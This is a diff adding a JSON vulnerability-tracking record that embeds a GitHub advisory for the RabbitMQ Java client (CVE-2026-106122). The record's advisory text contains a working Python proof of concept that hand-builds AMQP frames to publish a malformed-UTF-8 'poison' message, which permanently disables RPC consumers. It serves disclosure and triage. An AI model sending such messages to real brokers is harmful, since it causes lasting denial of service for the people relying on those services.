@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 3, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/93943694?v=4\", \"events_url\": \"https://api.github.com/users/ba-am/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/ba-am/followers\", \"following_url\": \"https://api.github.com/users/ba-am/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/ba-am/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/ba-am\", \"id\": 93943694, \"login\": \"ba-am\", \"node_id\": \"U_kgDOBZl3jg\", \"organizations_url\": \"https://api.github.com/users/ba-am/orgs\", \"received_events_url\": \"https://api.github.com/users/ba-am/received_events\", \"repos_url\": \"https://api.github.com/users/ba-am/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/ba-am/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/ba-am/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/ba-am\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-106122\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 6.0, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-172\", \"name\": \"Encoding Error\"}, {\"cwe_id\": \"CWE-248\", \"name\": \"Uncaught Exception\"}], \"description\": \"### Summary\\n\\nA single AMQP message with malformed UTF-8 in a shortstr property (for example `correlation-id`) can permanently disable a Java client RPC consumer.\\n\\nThe client decodes malformed bytes into U+FFFD replacement characters. Each of those re-encodes to 3 bytes, so a 255-byte property becomes 765 bytes (over the 255-byte shortstr limit). When the application echoes that value back, as the documented RPC pattern does, the encoder throws an unchecked `IllegalArgumentException`. That kills the consumer loop or tears down the channel.\\n\\nThe message is never acknowledged, so the broker requeues it and it disables the next consumer that picks it up. Recovery does not help; the service stays down until an operator manually purges the queue.\\n\\nIn short: the decoder produces values the encoder rejects, and any client permitted to *use* an RPC service can permanently destroy it for everyone.\\n\\n### Details\\n\\n`ValueReader.readShortstr` decodes with `new String(b, StandardCharsets.UTF_8)`, which silently substitutes U+FFFD for malformed input:\\n\\nhttps://github.com/rabbitmq/rabbitmq-java-client/blob/main/src/main/java/com/rabbitmq/client/impl/ValueReader.java#L69-L75\\n\\n`ValueWriter.writeShortstr` then rejects the result with an unchecked exception:\\n\\nhttps://github.com/rabbitmq/rabbitmq-java-client/blob/main/src/main/java/com/rabbitmq/client/impl/ValueWriter.java#L44-L56\\n\\nSo a value the library itself produced cannot be passed back to the library. Any shortstr property that arrives from the wire and is echoed back (`correlation-id`, `reply-to` used as a routing key, `message-id`, `type`, `app-id`) is affected.\\n\\nTwo consumption paths are impacted:\\n\\n1. **`RpcServer.mainloop()`** catches only `InterruptedException` and `ShutdownSignalException`, so the exception escapes and the loop thread dies silently:\\n   https://github.com/rabbitmq/rabbitmq-java-client/blob/main/src/main/java/com/rabbitmq/client/RpcServer.java#L109-L129\\n\\n2. **The pattern in the official tutorial** (`basicConsume` + `DeliverCallback`, echoing `correlationId` and publishing to `replyTo`) throws inside the callback, and the channel is closed by the exception handler. This is the more widely used of the two.\\n\\nIn both cases `autoAck` is `false` and the ack is never reached, so the message returns to the queue.\\n\\nA related instance exists in the library's own recovery path: `RecordedConsumer.recover()` re-sends the broker-assigned consumer tag, which would hit the same throw if a malicious broker assigned a malformed tag.\\n\\n### PoC\\n\\nNeither the Java client nor pika can reproduce this: the Java writer rejects oversized strings, and both encode `str` as well-formed UTF-8, which does not expand. The frames must be written by hand. **A triager who tries with a stock client will not reproduce it.**\\n\\n1. Start a broker:\\n\\n```bash\\ndocker run -it --rm --name rabbitmq -p 5672:5672 rabbitmq\\n```\\n\\n2. Publish a message whose `correlation-id` is 255 × `0xFF`:\\n```python\\nimport socket, struct\\n\\ndef sstr(b):\\n    if isinstance(b, str): b = b.encode()\\n    return struct.pack(\\\">B\\\", len(b)) + b\\ndef lstr(b): return struct.pack(\\\">I\\\", len(b)) + b\\ndef fr(t, ch, p): return struct.pack(\\\">BHI\\\", t, ch, len(p)) + p + b\\\"\\\\xce\\\"\\ndef m(c, mi, a=b\\\"\\\"): return struct.pack(\\\">HH\\\", c, mi) + a\\n\\nQUEUE = \\\"rpc.poison\\\"\\ns = socket.create_connection((\\\"127.0.0.1\\\", 5672), timeout=10)\\n\\ndef rf():\\n    h = b\\\"\\\"\\n    while len(h) < 7: h += s.recv(7 - len(h))\\n    t, ch, sz = struct.unpack(\\\">BHI\\\", h)\\n    p = b\\\"\\\"\\n    while len(p) < sz: p += s.recv(sz - len(p))\\n    s.recv(1); return t, ch, p\\ndef wait(c, mi):\\n    while True:\\n        t, ch, p = rf()\\n        if t == 1 and struct.unpack(\\\">HH\\\", p[:4]) == (c, mi): return p[4:]\\n\\ns.sendall(b\\\"AMQP\\\\x00\\\\x00\\\\x09\\\\x01\\\"); wait(10, 10)\\ns.sendall(fr(1, 0, m(10, 11, struct.pack(\\\">I\\\", 0) + sstr(\\\"PLAIN\\\")\\n    + lstr(b\\\"\\\\x00guest\\\\x00guest\\\") + sstr(\\\"en_US\\\"))))\\ncm, fm, _ = struct.unpack(\\\">HIH\\\", wait(10, 30)[:8])   # must echo broker's limits\\ns.sendall(fr(1, 0, m(10, 31, struct.pack(\\\">H\\\", cm) + struct.pack(\\\">I\\\", fm) + struct.pack(\\\">H\\\", 0))))\\ns.sendall(fr(1, 0, m(10, 40, sstr(\\\"/\\\") + sstr(\\\"\\\") + b\\\"\\\\x00\\\"))); wait(10, 41)\\ns.sendall(fr(1, 1, m(20, 10, sstr(\\\"\\\")))); wait(20, 11)\\ns.sendall(fr(1, 1, m(50, 10, struct.pack(\\\">H\\\", 0) + sstr(QUEUE) + b\\\"\\\\x02\\\"\\n    + struct.pack(\\\">I\\\", 0)))); wait(50, 11)\\n\\ns.sendall(fr(1, 1, m(60, 40, struct.pack(\\\">H\\\", 0) + sstr(\\\"\\\") + sstr(QUEUE) + b\\\"\\\\x00\\\")))\\nprops = sstr(b\\\"\\\\xff\\\" * 255) + sstr(\\\"some-reply-queue\\\")   # correlation-id = bit 10, reply-to = bit 9\\ns.sendall(fr(2, 1, struct.pack(\\\">HHQ\\\", 60, 0, 6) + struct.pack(\\\">H\\\", (1 << 10) | (1 << 9)) + props))\\ns.sendall(fr(3, 1, b\\\"poison\\\"))\\n\\n# close cleanly, otherwise the broker may not commit the publish\\ns.sendall(fr(1, 0, m(10, 50, struct.pack(\\\">H\\\", 200) + sstr(\\\"done\\\") + struct.pack(\\\">HH\\\", 0, 0))))\\nwait(10, 51); s.close()\\nprint(\\\"published to\\\", QUEUE)\\n```\\n\\n3. Run a consumer using the tutorial pattern against `rpc.poison`:\\n\\n```java\\nDeliverCallback cb = (tag, delivery) -> {\\n    AMQP.BasicProperties reply = new AMQP.BasicProperties.Builder()\\n        .correlationId(delivery.getProperties().getCorrelationId()).build();\\n    channel.basicPublish(\\\"\\\", delivery.getProperties().getReplyTo(), reply, \\\"pong\\\".getBytes(\\\"UTF-8\\\"));\\n    channel.basicAck(delivery.getEnvelope().getDeliveryTag(), false);\\n};\\nchannel.basicConsume(\\\"rpc.poison\\\", false, cb, t -> {});\\n```\\n\\nObserved:\\n\\n```bash\\njava.lang.IllegalArgumentException: Short string too long; utf-8 encoded length = 765, max = 255.\\n  at com.rabbitmq.client.impl.ContentHeaderPropertyWriter.writeShortstr(...)\\n  at com.rabbitmq.client.impl.ChannelN.basicPublish(ChannelN.java:753)\\nchannel open after: false\\nqueue depth after: 1\\n```\\n\\nThe same message run against `RpcServer.mainloop()` kills the loop thread instead, and re-kills it on every restart.\\n\\n**Control:** 255 bytes of valid UTF-8 in the same field is handled normally and acked. The trigger is specifically the malformed input.\\n\\n**Negative results, for completeness:** automatic connection recovery does not re-open the channel, so there is no crash loop and no CPU or memory exhaustion. The impact is loss of availability, not resource consumption.\\n\\n### Impact\\nDenial of service against applications that implement AMQP RPC with this client, including the pattern shown in the official Java RPC tutorial.\", \"epss\": {\"percentage\": 0.00409, \"percentile\": 0.33044}, \"ghsa_id\": \"GHSA-7822-rcf6-97fx\", \"github_reviewed_at\": \"2026-10-07T20:25:29Z\", \"html_url\": \"https://github.com/advisories/GHSA-7822-rcf6-97fx\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-7822-rcf6-97fx\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-106122\"}], \"nvd_published_at\": \"2026-10-06T19:17:43Z\", \"published_at\": \"2026-10-07T20:25:29Z\", \"references\": [\"https://github.com/rabbitmq/rabbitmq-java-client/security/advisories/GHSA-7822-rcf6-97fx\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-106122\", \"https://github.com/rabbitmq/rabbitmq-java-client/pull/2065\", \"https://github.com/rabbitmq/rabbitmq-java-client/commit/b8bd750fa8c90690e859b18d6343b34421309020\", \"https://github.com/rabbitmq/rabbitmq-java-client/releases/tag/v5.36.0\", \"https://github.com/advisories/GHSA-7822-rcf6-97fx\"], \"repository_advisory_url\": \"https://api.github.com/repos/rabbitmq/rabbitmq-java-client/security-advisories/GHSA-7822-rcf6-97fx\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/rabbitmq/rabbitmq-java-client\", \"summary\": \"RabbitMQ: Malformed UTF-8 in shortstr properties permanently disables RPC consumers\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-07T20:25:33Z\", \"url\": \"https://api.github.com/advisories/GHSA-7822-rcf6-97fx\", \"vulnerabilities\": [{\"first_patched_version\": \"5.36.0\", \"package\": {\"ecosystem\": \"maven\", \"name\": \"com.rabbitmq:amqp-client\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 5.35.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-7822-rcf6-97fx",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "com.rabbitmq:amqp-client: <= 5.35.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-106122"
+    ],
+    "cvss_score": 6.0,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "com.rabbitmq:amqp-client"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-10-08T19:16:36.867332Z",
+  "provenance": {
+    "content_sha256": "a38c3be4c315c5322a73477be0ffa4cb4dbc921beb7f2aa4fa9ecd4650bda111",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-07T20:25:29Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-7822-rcf6-97fx",
+  "status": "active",
+  "title": "RabbitMQ: Malformed UTF-8 in shortstr properties permanently disables RPC consumers",
+  "updated_at": "2026-10-07T20:25:33Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-7822-rcf6-97fx"
+}
